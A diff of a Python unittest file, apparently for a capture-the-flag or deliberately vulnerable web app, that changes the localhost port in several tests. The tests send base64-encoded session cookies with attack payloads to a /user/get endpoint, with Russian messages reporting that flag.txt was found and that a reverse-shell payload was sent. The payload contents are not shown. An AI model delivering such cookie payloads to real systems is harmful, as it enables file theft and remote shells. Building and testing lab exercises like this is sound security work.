@@ -6,7 +6,7 @@ from base64 import b64encode
 class TestLogic(unittest.TestCase):
     def test_get_cookies(self):
         with req.Session() as s:
-            s.get('http://127.0.0.1:7172', allow_redirects=True)
+            s.get('http://127.0.0.1:7171', allow_redirects=True)
             cookies = s.cookies.get('session')
             print(f'Cookies: {cookies}')
             self.assertIsNotNone(cookies)
@@ -24,7 +24,7 @@ class TestLogic(unittest.TestCase):
             }
             '''.encode()
             cookies = {'session': b64encode(payload).decode()}
-            r = s.get('http://127.0.0.1:7172/user/get', cookies=cookies)
+            r = s.get('http://127.0.0.1:7171/user/get', cookies=cookies)
             self.assertEqual(r.status_code, 200)
 
 
@@ -42,7 +42,7 @@ class TestLogic(unittest.TestCase):
             }
             '''.encode()
             cookies = {'session': b64encode(payload).decode()}
-            r = s.get('http://127.0.0.1:7172/user/get', cookies=cookies)
+            r = s.get('http://127.0.0.1:7171/user/get', cookies=cookies)
             print(r.text)
             self.assertEqual(r.status_code, 200)
             print('flag.txt найден')
@@ -61,7 +61,7 @@ class TestLogic(unittest.TestCase):
             }
             '''.encode()
             cookies = {'session': b64encode(payload).decode()}
-            r = s.get('http://127.0.0.1:7172/user/get', cookies=cookies)
+            r = s.get('http://127.0.0.1:7171/user/get', cookies=cookies)
             print(r.text)
             self.assertEqual(r.status_code, 200)
             print('Пейлоад для развёртки reverse-shell отправлен')
